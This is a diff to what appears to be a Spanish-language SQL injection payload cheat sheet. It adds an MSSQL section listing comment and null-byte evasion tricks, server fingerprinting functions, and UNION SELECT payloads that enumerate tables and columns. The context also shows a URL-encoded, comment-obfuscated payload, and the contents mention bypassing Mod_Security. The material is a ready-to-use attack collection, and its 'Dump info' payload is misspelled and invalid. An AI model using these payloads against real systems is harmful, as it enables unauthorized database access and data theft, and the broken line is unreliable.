@@ -67,6 +67,8 @@ La mayoria de los payloads aquí mostrados estan creados o modificados por mi.
     * [sql inyection payload+ bypass Mod_Security](#sql-inyection-payload+-bypass-Mod_Security)
     * [Sql inyection payload + comment + hex/unhex](#Sql-inyection-payload-+-comment-+-hex/unhex)
     * [Sql inyection payload + url encode](#Sql-inyection-payload-+-url-encode)
+    * [MSSQL](#MSSQL)
+        
         
    
    
@@ -1062,6 +1064,36 @@ CONCAT(Tablas <br>,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFO
 ### Sql inyection payload + url encode 
 
 `+/*!12120%55%6e%49%6f%4e*/+(%53%65%4c%65%43%74+111,222,333,database(),555,...)+--+`
+
+
+## MSSQL
+
+```
+--           :     Comment Type 1
+--+          :     Comment Type 2
+--+-         :     SQL Comment
+/**/         :     Inline Comment
+;%00         :     Null Byte
+
+@@version    :     Current Version
+user_name()  :     Current User
+user         :     Current User
+db_name()    :     Current Database
+@@SERVERNAME :     Hostname
+
+Tables
+
+union select table_name from (select top 1 table_name from information_schema.tables order by 1) as 1 order by 1 desc--
+
+Columns
+
+union select column_name from (select top 1 column_name from information_schema.columns where table_name='table' order by 1) as 1 order by 1 desc--
+
+Dump info
+
+union select culumn form table--
+
+```
 
 
 
